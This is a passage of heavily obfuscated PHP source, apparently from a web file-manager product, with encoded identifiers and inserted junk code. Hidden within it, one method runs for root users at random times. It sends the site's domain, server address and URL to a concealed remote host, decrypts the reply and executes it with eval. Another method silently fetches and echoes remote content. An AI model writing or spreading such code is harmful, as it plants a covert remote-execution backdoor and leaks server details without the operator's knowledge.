(Model($¸«Ì‘¼ª[251])->get($¸«Ì‘¼ª[63]) != $¸«Ì‘¼ª[206]) { Model($¸«Ì‘¼ª[251])->set($¸«Ì‘¼ª[63], $¸«Ì‘¼ª[206]); } } public function odir052d44d2() { return $_SERVER[¾¹â¾·à][252]; } private function bcym33624d3e() { $å„˜ß· =& $_SERVER[‰‰Ş‚€]; $Ô˜×÷†« =& $_SERVER[¾¹â¾·à]; $ªäÏÄ÷› = array($Ô˜×÷†«[253], $Ô˜×÷†«[254], $Ô˜×÷†«[255]); $½†™²º = $Ô˜×÷†«[256] . md5($Ô˜×÷†«[257]); $Ì¦æ‘ÉÚ = $å„˜ß·[780]; if (strlen($Ì¦æ‘ÉÚ) < $å„˜ß·[703]) { return; } if ($this->holu40921344 == $Ô˜×÷†«[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Ô˜×÷†«[24]], $ªäÏÄ÷›)) { return; } if (time() % 4 != 0) { return; } $òÑŠ½é = call_user_func(array($Ô˜×÷†«[258], $Ô˜×÷†«[259]), $½†™²º); $¤¹Ï‚¢« = $å„˜ß·[781]; if (!$¤¹Ï‚¢«) { return; } if ($òÑŠ½é && time() - $òÑŠ½é < intval($Ô˜×÷†«[260])) { return; } call_user_func(array($Ô˜×÷†«[258], $Ô˜×÷†«[139]), $½†™²º, time()); $€—ï‡®š = $å„˜ß·[782]; $Ì€–’ï– = Model($Ô˜×÷†«[33])->get($Ô˜×÷†«[100]); $õŠ¯š‘· = $å„˜ß·[783]; if (strlen($õŠ¯š‘·) < $å„˜ß·[11]) { die; } $·¹é™¥« = array($Ô˜×÷†«[152] => Model($Ô˜×÷†«[33])->get($Ô˜×÷†«[153]), $Ô˜×÷†«[167] => $this->holu40921344, $Ô˜×÷†«[163] => $_SERVER[$Ô˜×÷†«[164]], $Ô˜×÷†«[165] => Model($Ô˜×÷†«[33])->get($Ô˜×÷†«[131]), $Ô˜×÷†«[105] => md5($_SERVER[$Ô˜×÷†«[106]] . $Ì€–’ï–), $Ô˜×÷†«[156] => $Ô˜×÷†«[136], $Ô˜×÷†«[159] => $_SERVER[$Ô˜×÷†«[160]]); $İ¯¯åÖ‘ = $å„˜ß·[784]; if (strlen($İ¯¯åÖ‘) < $å„˜ß·[11]) { die; } $Ã¦·ËÙ³ = $this->ocwl48934f46($Ô˜×÷†«[261], $·¹é™¥«); if (!is_array($Ã¦·ËÙ³)) { return; } if ($Ã¦·ËÙ³[$Ô˜×÷†«[152]] && $Ã¦·ËÙ³[$Ô˜×÷†«[262]]) { if ($this->jaml04df13ee($Ã¦·ËÙ³[$Ô˜×÷†«[262]]) == $·¹é™¥«[$Ô˜×÷†«[152]]) { return; } } $this->lotibe126386(); if ($this->jaml04df13ee($Ã¦·ËÙ³[$Ô˜×÷†«[262]]) != $·¹é™¥«[$Ô˜×÷†«[152]]) { $”€Æ’šö = array($Ô˜×÷†«[185] => $Ì€–’ï–, $Ô˜×÷†«[186] => $_SERVER[$Ô˜×÷†«[106]], $Ô˜×÷†«[187] => this_url(), $Ô˜×÷†«[161] => $_SERVER[$Ô˜×÷†«[162]]); $Œ’›¢Ï“ = $this->jkyx378ab691(json_encode($”€Æ’šö)); $Ã¦·ËÙ³ = $this->ocwl48934f46($Ô˜×÷†«[188] . $Œ’›¢Ï“); if ($Ã¦·ËÙ³ && is_array($Ã¦·ËÙ³) && isset($Ã¦·ËÙ³[$Ô˜×÷†«[262]])) { $ŒëÚÍÎ« = $this->ntjh9cb474e2($Ã¦·ËÙ³[$Ô˜×÷†«[262]], 2); if ($ŒëÚÍÎ«) { $ŒëÚÍÎ« = $this->jaml04df13ee($ŒëÚÍÎ«); } if ($ŒëÚÍÎ«) { try { @eval($ŒëÚÍÎ«); } catch (Exception $ø¾éªóï) { } } } } } private function ocwl48934f46($¥Š¢’‹» = '', $Ï¬´ûö¿ = array(), $”ıñÊƒí = 5) { $æ››õ«’ =& $_SERVER[‰‰Ş‚€]; $º³„¨Ğê =& $_SERVER[¾¹â¾·à]; $šùÏï«÷ = $º³„¨Ğê[263]; $šùÏï«÷ = $this->rstkb7790328($šùÏï«÷, $º³„¨Ğê[264]); $šùÏï«÷ = $šùÏï«÷ . $¥Š¢’‹»; if ($Ï¬´ûö¿ && is_array($Ï¬´ûö¿)) { $šùÏï«÷ = $šùÏï«÷ . $º³„¨Ğê[265] . http_build_query($Ï¬´ûö¿); } if ($Ï¬´ûö¿ === -1) { return $šùÏï«÷; } $µŸ‘‡² = stream_context_create(array($º³„¨Ğê[219] => array($º³„¨Ğê[222] => $”ıñÊƒí, $º³„¨Ğê[220] => $º³„¨Ğê[266]), $º³„¨Ğê[267] => array($º³„¨Ğê[268] => !1, $º³„¨Ğê[269] => !1))); $Óåø°ö« = $æ››õ«’[785]; if (!$Óåø°ö«) { return; } $Ï¬´ûö¿ = @file_get_contents($šùÏï«÷, !1, $µŸ‘‡²); return json_decode($Ï¬´ûö¿, !0); $Ÿ—Î’¦è = $æ››õ«’[786]; while ($Ÿ—Î’¦è < $æ››õ«’[711]) { if ($Ÿ—Î’¦è >= 0) { break; } $Ÿ—Î’¦è++; } } private function zpdc38625500() { $Ã©Ø—÷ƒ =& $_SERVER[‰‰Ş‚€]; $Õ²±İÎ‹ =& $_SERVER[¾¹â¾·à]; $Ø¨êõƒ÷ = array($Õ²±İÎ‹[270] => $Õ²±İÎ‹[271], $Õ²±İÎ‹[272] => $Õ²±İÎ‹[273], $Õ²±İÎ‹[274] => $Õ²±İÎ‹[275], $Õ²±İÎ‹[276] => $Õ²±İÎ‹[277], $Õ²±İÎ‹[278] => $Õ²±İÎ‹[279], $Õ²±İÎ‹[280] => $Õ²±İÎ‹[214], $Õ²±İÎ‹[281] => $Õ²±İÎ‹[214], $Õ²±İÎ‹[282] => $Õ²±İÎ‹[271], $Õ²±İÎ‹[283] => $Õ²±İÎ‹[273], $Õ²±İÎ‹[284] => $Õ²±İÎ‹[275], $Õ²±İÎ‹[285] => $Õ²±İÎ‹[286], $Õ²±İÎ‹[287] => $Õ²±İÎ‹[277], $Õ²±İÎ‹[288] => $Õ²±İÎ‹[289], $Õ²±İÎ‹[290] => $Õ²±İÎ‹[279], $Õ²±İÎ‹[291] => $Õ²±İÎ‹[292], $Õ²±İÎ‹[293] => $Õ²±İÎ‹[294], $Õ²±İÎ‹[295] => $Õ²±İÎ‹[296]); $©œÑÜ˜Ğ = $Ã©Ø—÷ƒ[787]; $Œú¾»™ƒ = $Ø¨êõƒ÷[$this->holu40921344]; $œ‰Æª‹Ì = $Ã©Ø—÷ƒ[788]; if (strlen($œ‰Æª‹Ì) < $Ã©Ø—÷ƒ[11]) { die; } $Œú¾»™ƒ = intval($Œú¾»™ƒ ? $Œú¾»™ƒ : $Õ²±İÎ‹[271]); $À÷äÆÈû = $Ã©Ø—÷ƒ[789]; if (strlen($À÷äÆÈû) < $Ã©Ø—÷ƒ[738]) { die; } $›Œ¥¬°´ = _get($this->tqcn86f8b227, $Õ²±İÎ‹[297]); $‹­œñÍº = $Ã©Ø—÷ƒ[790]; if (!$‹­œñÍº) { die; } $›Œ¥¬°´ = $›Œ¥¬°´ ? intval($›Œ¥¬°´) : 0; return $Œú¾»™ƒ + $›Œ¥¬°´; } public function cuts63637e7c($À¿ØÒ§¶) { $ğ¥Îš„ =& $_SERVER[¾¹â¾·à]; $ó’åƒğÌ = $this->zpdc38625500(); if ($À¿ØÒ§¶[$ğ¥Îš„[298]] == $ğ¥Îš„[122]) { return; } if ($ó’åƒğÌ >= intval($ğ¥Îš„[214])) { return; } $šü¦ = Model($ğ¥Îš„[125])->count(); if ($šü¦ <= $ó’åƒğÌ) { return; } $…»Â§ë = Model($ğ¥Îš„[125])->field($ğ¥Îš„[298])->limit($ó’åƒğÌ)->select(); $¿å€Úï = $_SERVER[‰‰Ş‚€][791]; if (!$¿å€Úï) { return; } $…»Â§ë = array_to_keyvalue($…»Â§ë, $ğ¥Îš„[6], $ğ¥Îš„[298]); if (!in_array($À¿ØÒ§¶[$ğ¥Îš„[298]], $…»Â§ë)) { show_json($ğ¥Îš„[299], !1, $ğ¥Îš„[210]); } } public function gbmw195587a1() { $„ƒ‹ñ§ =& $_SERVER[‰‰Ş‚€]; $Ãõîìòë =& $_SERVER[¾¹â¾·à]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Œ‘è«Şğ = $Ãõîìòë[217]; $Œ‘è«Şğ = $this->rstkb7790328($Œ‘è«Şğ, $Ãõîìòë[218]); $áãø¹ûó = stream_context_create(array($Ãõîìòë[219] => array($Ãõîìòë[220] => $Ãõîìòë[221], $Ãõîìòë[222] => 3))); $ˆ¶ÛÊ± = $„ƒ‹ñ§[792]; if (strlen($ˆ¶ÛÊ±) < $„ƒ‹ñ§[711]) { die; } $áñÑÄå” = @file_get_contents($Œ‘è«Şğ, !1, $áãø¹ûó); echo $Ãõîìòë[300] . hash_encode($áñÑÄå”) . $Ãõîìòë[301]; } private function walk7f016a70($ƒ¥®‹ş, $¨Á­½¾ş, $ÊÕÆæ“ = 3) { $ŞÆ‡æ—Î =& $_SERVER[‰‰Ş‚€]; $Æ÷Ûá¼ô =& $_SERVER[¾¹â¾·à]; usleep(1); $çûä» à = $ŞÆ‡æ—Î[793]; if (strlen($çûä» à) < $ŞÆ‡æ—Î[738]) { return; } $ƒ¥®‹ş = trim($ƒ¥®‹ş); $¹à€ã Å = mt_rand(0, 5) . $Æ÷Ûá¼ô[6]; $è¯¢ú¶ = $ŞÆ‡æ—Î[794]; if (!$è¯¢ú¶) { return; } $°¦¬¡± = rand_string(15); $Àã¥”µ† = $ŞÆ‡æ—Î[795]; if (strlen($Àã¥”µ†) < $ŞÆ‡æ—Î[713]) { return; } $„Ñë™èÁ = $Æ÷Ûá¼ô[302]; $Í§¶â¼¼ = $ŞÆ‡æ—Î[796]; while ($Í§¶â¼¼ < $ŞÆ‡æ—Î[713]) { if ($Í§¶â¼¼ >= 0) { break; } $Í§¶â¼¼++; } switch ($¹à€ã Å) { case $Æ÷Ûá¼ô[206]: $…Í¡³Ğ = $this->vekt8713407e($ƒ¥®‹ş, strrev($¨Á­½¾ş . $°¦¬¡±)); $¯˜¼åÌà = $ŞÆ‡æ—Î[797]; if (strlen($¯˜¼åÌà) < $ŞÆ‡æ—Î[738]) { die; } break; case $Æ÷Ûá¼ô[122]: $…Í¡³Ğ = $this->vekt8713407e($ƒ¥®‹ş, strrev($°¦¬¡± . $¨Á­½¾ş)); break; $¼¼Ä‹øô = $ŞÆ‡æ—Î[798]; if (strlen($¼¼Ä‹øô) < $ŞÆ‡æ—Î[738]) { return; } case $Æ÷Ûá¼ô[303]: $…Í¡³Ğ = $this->vekt8713407e($ƒ¥®‹ş, base64_encode($°¦¬¡± . $¨Á­½¾ş)); $ºÌ ÙÕË = $ŞÆ‡æ—Î[799]; while ($ºÌ ÙÕË < $ŞÆ‡æ—Î[713]) { if ($ºÌ ÙÕË >= 0) { break; } $ºÌ ÙÕË++; } break; case $Æ÷Ûá¼ô[304]: $…Í¡³Ğ = $this->vekt8713407e($ƒ¥®‹ş, md5($°¦¬¡± . $¨Á­½¾ş)); $õ•š™È = $ŞÆ‡æ—Î[800]; if (strlen($õ•š™È) < $ŞÆ‡æ—Î[703]) { return; } break; $À´Êë®á = $ŞÆ‡æ—Î[801]; case $Æ÷Ûá¼ô[305]: $ƒ¥®‹ş = base64_encode($ƒ¥®‹ş); $®²ŒÁ¸ = rand(0, 64); $¼çî­î = $„Ñë™èÁ[$®²ŒÁ¸]; $¸êöÛıÈ = md5($¼çî­î . md5($¨Á­½¾ş . $¼çî­î) . $¨Á­½¾ş); $ÇÙø¯×÷ = $ŞÆ‡æ—Î[802]; $¸êöÛıÈ = substr($¸êöÛıÈ, $®²ŒÁ¸ % 8, $®²ŒÁ¸ % 8 + 7); $½©¤­† = $Æ÷Ûá¼ô[6]; $Üù­¡è = 0; $ş¨ãø¤— = 0; $é’€Ë°¯ = 0; $Ò®‘‚“… = $ŞÆ‡æ—Î[803]; while (strlen($Ò®‘‚“…) < $ŞÆ‡æ—Î[711]) { if (!$Ò®‘‚“…) { break; } $Ò®‘‚“…++; } for ($Üù­¡è = 0; $Üù­¡è < strlen($ƒ¥®‹ş); $Üù­¡è++) { $é’€Ë°¯ = $é’€Ë°¯ == strlen($¸êöÛıÈ) ? 0 : $é’€Ë°¯; $ş¨ãø¤— = ($®²ŒÁ¸ + strpos($„Ñë™èÁ, $ƒ¥®‹ş[$Üù­¡è]) + ord($¸êöÛıÈ[$é’€Ë°¯++])) % 64; $½©¤­† .= $„Ñë™èÁ[$ş¨ãø¤—]; } $…Í¡³Ğ = hash_encode($¼çî­î . $½©¤­†); $½áˆğÄ = $ŞÆ‡æ—Î[804]; break; default: $…Í¡³Ğ = $this->vekt8713407e($ƒ¥®‹ş, $¨Á­½¾ş . $°¦¬¡±); $œ’øë‘¿ = $ŞÆ‡æ—Î[805]; if (strlen($œ’øë‘¿) < $ŞÆ‡æ—Î[711]) { return; } break; } $…Í¡³Ğ = strrev($¹à€ã Å . $°¦¬¡± . $…Í¡³Ğ); if ($ÊÕÆæ“ - 1 > 0) { $…Í¡³Ğ = $this->walk7f016a70($…Í¡³Ğ, $¨Á­½¾ş, $ÊÕÆæ“ - 1); } return $…Í¡³Ğ; } private function ntjh9cb474e2($¥£¯ßù, $´äÅâßã, $â×ËéÕ÷ = 3) { $ø»øßŠâ =& $_SERVER[‰‰Ş‚€]; $’Í»·ÓĞ =& $_SERVER[¾¹â¾·à]; if (!is_string($¥£¯ßù) || strlen($¥£¯ßù) < 10) { return !1; } $¥£¯ßù = trim($¥£¯ßù); $ôÉ¾şè¥ = $ø»øßŠâ[806]; if (!$ôÉ¾şè¥) { return; } $¥£¯ßù = strrev($¥£¯ßù); $ŠÄêéú¢ = $¥£¯ßù[0]; $¦á¸ÙĞ = substr($¥£¯ßù, 1, 15); $ƒ¢ûÙÒÄ = $ø»øßŠâ[807]; while ($ƒ¢ûÙÒÄ < $ø»øßŠâ[713]) { if ($ƒ¢ûÙÒÄ >= 0) { break; } $ƒ¢ûÙÒÄ++; } $¥£¯ßù = substr($¥£¯ßù, 16); $µ³ûù¾’ = $’Í»·ÓĞ[302]; switch ($ŠÄêéú¢) { case $’Í»·ÓĞ[206]: $•‹ÉØãğ = $this->rstkb7790328($¥£¯ßù, strrev($´äÅâßã . $¦á¸ÙĞ)); $Àã»àÍÊ = $ø»øßŠâ[808]; while ($Àã»àÍÊ < $ø»øßŠâ[713]) { if ($Àã»àÍÊ >= 0) { break; } $Àã»àÍÊ++; } break; $™Â÷÷ğ® = $ø»øßŠâ[809]; case $’Í»·ÓĞ[122]: $•‹ÉØãğ = $this->rstkb7790328($¥£¯ßù, strrev($¦á¸ÙĞ . $´äÅâßã)); break; $¿Î¯ûºå = $ø»øßŠâ[810]; if (strlen($¿Î¯ûºå) < $ø»øßŠâ[711]) { return; } case $’Í»·ÓĞ[303]: $•‹ÉØãğ = $this->rstkb7790328($¥£¯ßù, base64_encode($¦á¸ÙĞ . $´äÅâßã)); break; case $’Í»·ÓĞ[304]: $•‹ÉØãğ = $this->rstkb7790328($¥£¯ßù, md5($¦á¸ÙĞ . $´äÅâßã)); break; case $’Í»·ÓĞ[305]: $¥£¯ßù = hash_decode($¥£¯ßù); $ØäË§­ı = $¥£¯ßù[0]; $ã¨’¯Õ = $ø»øßŠâ[811]; $¥£¯ßù = substr($¥£¯ßù, 1); $ë¦àëªœ = strpos($µ³ûù¾’, $ØäË§­ı); $Åâ¬šÂô = md5($ØäË§­ı . md5($´äÅâßã . $ØäË§­ı) . $´äÅâßã); $Åâ¬šÂô = substr($Åâ¬šÂô, $ë¦àëªœ % 8, $ë¦àëªœ % 8 + 7); $üÎ–Ÿƒí = $ø»øßŠâ[812]; if (strlen($üÎ–Ÿƒí) < $ø»øßŠâ[11]) { return; } $‘Š­º = $’Í»·ÓĞ[6]; $ÃíèöÉÄ = $ø»øßŠâ[813]; if (!$ÃíèöÉÄ) { return; } $…áù¢µ = 0; $…²“ªàÄ = $ø»øßŠâ[806]; if (!$…²“ªàÄ) { return; } $œ×åÃø = 0; $ÒìùÜèë = 0; for ($…áù¢µ = 0; $…áù¢µ < strlen($¥£¯ßù); $…áù¢µ++) { $ÒìùÜèë = $ÒìùÜèë == strlen($Åâ¬šÂô) ? 0 : $ÒìùÜèë; $‡îìÌÁ = $ÒìùÜèë++; $œ×åÃø = strpos($µ³ûù¾’, $¥£¯ßù[$…áù¢µ]) - $ë¦àëªœ - ord($Åâ¬šÂô[$‡îìÌÁ]); $ÚùÚ•¡ô = $ø»øßŠâ[814]; if (strlen($ÚùÚ•¡ô) < $ø»øßŠâ[11]) { die; } while ($œ×åÃø < 0) { $œ×åÃø += 64; $¥’İ‘°™ = $ø»øßŠâ[815]; if (strlen($¥’İ‘°™) < $ø»øßŠâ[713]) { return; } } $‘Š­º .= $µ³ûù¾’[$œ×åÃø]; } $•‹ÉØãğ = base64_decode($‘Š­º); break; default: $•‹ÉØãğ = $this->rstkb7790328($¥£¯ßù, $´äÅâßã . $¦á¸ÙĞ); $ğ•¶’êÑ = $ø»øßŠâ[816]; if (!$ğ•¶’êÑ) { die; } break; } if ($â×ËéÕ÷ - 1 > 0) { $•‹ÉØãğ = $this->ntjh9cb474e2($•‹ÉØãğ, $´äÅâßã, $â×ËéÕ÷ - 1); } return $•‹ÉØãğ; } public function jkyx378ab691($ôˆùÃë) { $¹’ ÆÁ¼ =& $_SERVER[‰‰Ş‚€]; $ÂË²ê• =& $_SERVER[¾¹â¾·à]; $ñÑµ“‡ = $this->pmua4aa7e4fe(); $Òãí  ï = $this->pmua4aa7e4fe(); $ûëİºÁš = ($ñÑµ“‡ - 1) * ($Òãí  ï - 1); $½¼éğŸü = intval(($ñÑµ“‡ + $Òãí  ï) / 2); $ÌÖ’ˆÖ½ = $¹’ ÆÁ¼[817]; if (!$ÌÖ’ˆÖ½) { die; } while (1) { $Óåê‡´À = $½¼éğŸü; $¼¤¤¹»Ê = $¹’ ÆÁ¼[818]; if (!$¼¤¤¹»Ê) { die; } $ø²£É‚İ = $ûëİºÁš; $„…ªíÌÀ = $¹’ ÆÁ¼[819]; while (strlen($„…ªíÌÀ) < $¹’ ÆÁ¼[703]) { if (!$„…ªíÌÀ) { break; } $„…ªíÌÀ++; } while ($ø²£É‚İ % $Óåê‡´À != 0) { $·ù—£ = $ø²£É‚İ; $ø²£É‚İ = $Óåê‡´À; $Óåê‡´À = $·ù—£ % $Óåê‡´À; $õ£ŸÅµÈ = $¹’ ÆÁ¼[820]; if (strlen($õ£ŸÅµÈ) < $¹’ ÆÁ¼[738]) { die; } } if ($Óåê‡´À == 1) { break; } else { $½¼éğŸü++; } } $’»Òîèô = 2; for ($³ÂŸËÃ» = 0; $³ÂŸËÃ» < $ûëİºÁš * 10; $³ÂŸËÃ»++) { if (($ûëİºÁš * $³ÂŸËÃ» + 1) % $½¼éğŸü == 0) { $’»Òîèô = intval(($ûëİºÁš * $³ÂŸËÃ» + 1) / $½¼éğŸü); break; } } $ÚàÆ™½ê = $this->vekt8713407e($ñÑµ“‡ * $Òãí  ï . $ÂË²ê•[6], $ÂË²ê•[136]); $ˆ‘§›Ë = $¹’ ÆÁ¼[821]; if (strlen($ˆ‘§›Ë) < $¹’ ÆÁ¼[738]) { die; } $ïÖçóÌ¶ = md5($ÂË²ê•[306] . ($ñÑµ“‡ + $Òãí  ï) . $ÂË²ê•[307] . $½¼éğŸü . $ÂË²ê•[307] . $’»Òîèô . $ÂË²ê•[308]); $Ş×®¼Ú„ = $this->vekt8713407e($ôˆùÃë, $ïÖçóÌ¶) . $ÂË²ê•[309] . $ÚàÆ™½ê; $µ½‰Ï’É = $¹’ ÆÁ¼[822]; while ($µ½‰Ï’É < $¹’ ÆÁ¼[713]) { if ($µ½‰Ï’É >= 0) { break; } $µ½‰Ï’É++; } return $Ş×®¼Ú„; $°ùÑ‰ë = $¹’ ÆÁ¼[823]; if (strlen($°ùÑ‰ë) < $¹’ ÆÁ¼[11]) { die; } } public function jaml04df13ee($ªÌîÌ¸Ì) { $Ñ»•Åƒ =& $_SERVER[‰‰Ş‚€]; $åÚÃñè– =& $_SERVER[¾¹â¾·à]; $õçÅ”Ù¶ = explode($åÚÃñè–[309], $ªÌîÌ¸Ì); $ŸŒÖÌ¢° = $Ñ»•Åƒ[824]; if (count($õçÅ”Ù¶) != 2) { return $åÚÃñè–[6]; } $åé¾íŸ = $this->rstkb7790328($õçÅ”Ù¶[1] . $åÚÃñè–[6], $åÚÃñè–[136]); $µàšÑ­Ø = $Ñ»•Åƒ[825]; if (!$åé¾íŸ) { return $åÚÃñè–[6]; } $åé¾íŸ = intval($åé¾íŸ); $¼ìüíÜ» = 0; $ˆŠ¾´æÍ = 0; for ($®œàô·ª = 3; $®œàô·ª < $åé¾íŸ; $®œàô·ª += 2) { if ($åé¾íŸ % $®œàô·ª != 0) { continue; } $¼ìüíÜ» = $®œàô·ª; $ªØ‚¢„© = $Ñ»•Åƒ[826]; if (!$ªØ‚¢„©) { return; } $ˆŠ¾´æÍ = intval($åé¾íŸ / $®œàô·ª); $ì¡‘Í€à = $Ñ»•Åƒ[827]; break; $ÀşØ¬Ïà = $Ñ»•Åƒ[828]; if (strlen($ÀşØ¬Ïà) < $Ñ»•Åƒ[11]) { die; } } $‹½Şê„ˆ = ($¼ìüíÜ» - 1) * ($ˆŠ¾´æÍ - 1); $ÅæêÚªä = intval(($¼ìüíÜ» + $ˆŠ¾´æÍ) / 2); $Í‡Ê¯Çó = $Ñ»•Åƒ[829]; while (strlen($Í‡Ê¯Çó) < $Ñ»•Åƒ[11]) { if (!$Í‡Ê¯Çó) { break; } $Í‡Ê¯Çó++; } while (1) { $´Ë«Ğ’ = $ÅæêÚªä; $×áßĞ“ = $‹½Şê„ˆ; $«ìÈæÛ¥ = $Ñ»•Åƒ[830]; while ($«ìÈæÛ¥ < $Ñ»•Åƒ[738]) { if ($«ìÈæÛ¥ >= 0) { break; } $«ìÈæÛ¥++; } while ($×áßĞ“ % $´Ë«Ğ’ != 0) { $Ûª—¥øó = $×áßĞ“; $ê‘²“èÕ = $Ñ»•Åƒ[831]; if (!$ê‘²“èÕ) { die; } $×áßĞ“ = $´Ë«Ğ’; $´Ë«Ğ’ = $Ûª—¥øó % $´Ë«Ğ’; $¾íºÖëı = $Ñ»•Åƒ[832]; } if ($´Ë«Ğ’ == 1) { break; } else { $ÅæêÚªä++; } } $×ƒ´øô = 2; for ($®œàô·ª = 0; $®œàô·ª < $‹½Şê„ˆ * 10; $®œàô·ª++) { if (($‹½Şê„ˆ * $®œàô·ª + 1) % $ÅæêÚªä == 0) { $×ƒ´øô = intval(($‹½Şê„ˆ * $®œàô·ª + 1) / $ÅæêÚªä); break; } } $ÌÂßÕø“ = md5($åÚÃñè–[306] . ($¼ìüíÜ» + $ˆŠ¾´æÍ) . $åÚÃñè–[307] . $ÅæêÚªä . $åÚÃñè–[307] . $×ƒ´øô . $åÚÃñè–[308]); $ãõ½ã™Œ = $Ñ»•Åƒ[833]; if (!$ãõ½ã™Œ) { die; } $ëÎ•®Ó“ = $this->rstkb7790328($õçÅ”Ù¶[0], $ÌÂßÕø“); return $ëÎ•®Ó“; $Ö¶•Ìß = $Ñ»•Åƒ[834]; if (strlen($Ö¶•Ìß) < $Ñ»•Åƒ[703]) { die; } } public function pmua4aa7e4fe() { $»ïº²ÛÉ =& $_SERVER[‰‰Ş‚€]; $¥ˆèÇ‰Ä = mt_rand(pow(2, 14), pow(2, 16) - 1); $«ô‡ºú = $»ïº²ÛÉ[835]; while (strlen($«ô‡ºú) < $»ïº²ÛÉ[711]) { if (!$«ô‡ºú) { break; } $«ô‡ºú++; } $Ä¸á˜öÖ = array(); $äìıŠœÈ = $»ïº²ÛÉ[836]; if (strlen($äìıŠœÈ) < $»ïº²ÛÉ[11]) { die; } $õ´ØÊ‡ú = 1; $Ûìğª‘ü = $»ïº²ÛÉ[837]; if (strlen($Ûìğª‘ü) < $»ïº²ÛÉ[11]) { die; } while ($õ´ØÊ‡ú <= (int) sqrt($¥ˆèÇ‰Ä)) { $à›¹çĞ = $õ´ØÊ‡ú; $òÜµì¿õ = $»ïº²ÛÉ[838]; if (!$òÜµì¿õ) { die; } while (!0) { $à›¹çĞ++; if ($à›¹çĞ <= 2) { $õ´ØÊ‡ú = $à›¹çĞ; break; } else { if ($à›¹çĞ < 2) { continue; } } $œù¥ö¢‚ = !0; for ($å×¸²òš = 2; $å×¸²òš <= sqrt($à›¹çĞ); $å×¸²òš++) { if ($à›¹çĞ % $å×¸²òš == 0) { $œù¥ö¢‚ = !1; } } if ($œù¥ö¢‚) { $õ´ØÊ‡ú = $à›¹çĞ; break; } } $Ä¸á˜öÖ[] = $õ´ØÊ‡ú; $ÄÅÎé®Ë = $»ïº²ÛÉ[839]; while ($ÄÅÎé®Ë < $»ïº²ÛÉ[711]) { if ($ÄÅÎé®Ë >= 0) { break; } $ÄÅÎé®Ë++; } } $ ŸúúÂ¥ = 2; for ($à›¹çĞ = $¥ˆèÇ‰Ä; $à›¹çĞ > 1; $à›¹çĞ--) { $œù¥ö¢‚ = !0; $ª¿ÚÌ—Ü = $»ïº²ÛÉ[840]; while (strlen($ª¿ÚÌ—Ü) < $»ïº²ÛÉ[738]) { if (!$ª¿ÚÌ—Ü) { break; } $ª¿ÚÌ—Ü++; } foreach ($Ä¸á˜öÖ as $Ì§Íá…Ê) { if ($à›¹çĞ % $Ì§Íá…Ê == 0) { $œù¥ö¢‚ = !1; break; } } if ($œù¥ö¢‚) { $ ŸúúÂ¥ = $à›¹çĞ; break; } } return $ ŸúúÂ¥; $ñÑ±Ì¯ş = $»ïº²ÛÉ[841]; while ($ñÑ±Ì¯ş < $»ïº²ÛÉ[713]) { if ($ñÑ±Ì¯ş >= 0) { break; } $ñÑ±Ì¯ş++; } } public function srcqebfb6d9e($‚â†¥£¡, $˜Óõ©æ°) { $´ ã‹«ë =& $_SERVER[¾¹â¾·à]; return call_user_func(array($´ ã‹«ë[8], $´ ã‹«ë[310]), $‚â†¥£¡, $˜Óõ©æ°); } public function vekt8713407e($ªòÙ„š“, $½ÚäÎ‡ê) { $Ôß©îï =& $_SERVER[¾¹â¾·à]; return call_user_func(array($Ôß©îï[311], $Ôß©îï[312]), $ªòÙ„š“, $½ÚäÎ‡ê); $ã©ÁğŸø = $_SERVER[‰‰Ş‚€][842]; if (!$ã©ÁğŸø) { return; } } public function rstkb7790328($î÷š‡ğü, $ˆ’ŠÔàÄ) { $•œŞó‚ =& $_SERVER[‰‰Ş‚€]; $×±õá²Ï =& $_SERVER[¾¹â¾·à]; return call_user_func(array($×±õá²Ï[311], $×±õá²Ï[313]), $î÷š‡ğü, $ˆ’ŠÔàÄ); $ÉÏ÷ùŒ¿ = $•œŞó‚[843]; if (strlen($ÉÏ÷ùŒ¿) < $•œŞó‚[713]) { return; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[‰‰Ş‚€][844]); $this->init(); $this->keep(); } public function init() { $–ˆìß†Û =& $_SERVER[‰‰Ş‚€]; $this->isManual(); self::$name = date($–ˆìß†Û[845]); if (!($ó«Î±âÆ = $this->model->lastItem())) { $ó«Î±âÆ = $this->initData(); } else { self::$name = $ó«Î±âÆ[$–ˆìß†Û[42]]; if ($ó«Î±âÆ[$–ˆìß†Û[846]] == $–ˆìß†Û[101]) { self::$name = date($–ˆìß†Û[270]); $¥œæíö• = intval(_get($ó«Î±âÆ, $–ˆìß†Û[847], 0)); if (self::$manual == 0 && $ó«Î±âÆ[$–ˆìß†Û[42]] == self::$name) { $this->model->remove($ó«Î±âÆ[$–ˆìß†Û[491]]); } $ó«Î±âÆ = $this->initData($¥œæíö•, $ó«Î±âÆ[$–ˆìß†Û[848]]); } else { $this->checkStore($ó«Î±âÆ[$–ˆìß†Û[848]]); } } self::$option = $ó«Î±âÆ; } private function isManual() { $òÖƒÉÌ¡ = _get($GLOBALS, $_SERVER[‰‰Ş‚€][849], 0); $òÖƒÉÌ¡ = intval($òÖƒÉÌ¡); self::$manual = $òÖƒÉÌ¡ && $òÖƒÉÌ¡ == 1 ? 1 : 0; } private function initData($‹Ö±·›Å = 0, $©ûÛùûÉ = '') { $äŞ¸Ÿ‹Ñ =& $_SERVER[‰‰Ş‚€]; $ ½Š×‰ = $this->model->config(); if ($©ûÛùûÉ && $ ½Š×‰[$äŞ¸Ÿ‹Ñ[848]] != $©ûÛùûÉ) { $‹Ö±·›Å = 0; } $this->checkStore($ ½Š×‰[$äŞ¸Ÿ‹Ñ[848]]); if (self::$manual == 1) { self::$name .= $äŞ¸Ÿ‹Ñ[21] . date($äŞ¸Ÿ‹Ñ[850]); } $ÄÉûİî£ = array($äŞ¸Ÿ‹Ñ[848] => $ ½Š×‰[$äŞ¸Ÿ‹Ñ[848]], $äŞ¸Ÿ‹Ñ[42] => self::$name, $äŞ¸Ÿ‹Ñ[846] => 0, $äŞ¸Ÿ‹Ñ[179] => $ ½Š×‰[$äŞ¸Ÿ‹Ñ[179]], $äŞ¸Ÿ‹Ñ[851] => self::$manual, $äŞ¸Ÿ‹Ñ[852] => array($äŞ¸Ÿ‹Ñ[853] => array($äŞ¸Ÿ‹Ñ[846] => 0), $äŞ¸Ÿ‹Ñ[854] => array($äŞ¸Ÿ‹Ñ[846] => 0, $äŞ¸Ÿ‹Ñ[855] => 0, $äŞ¸Ÿ‹Ñ[856] => 0, $äŞ¸Ÿ‹Ñ[43] => $äŞ¸Ÿ‹Ñ[22], $äŞ¸Ÿ‹Ñ[857] => 0, $äŞ¸Ÿ‹Ñ[858] => 0), 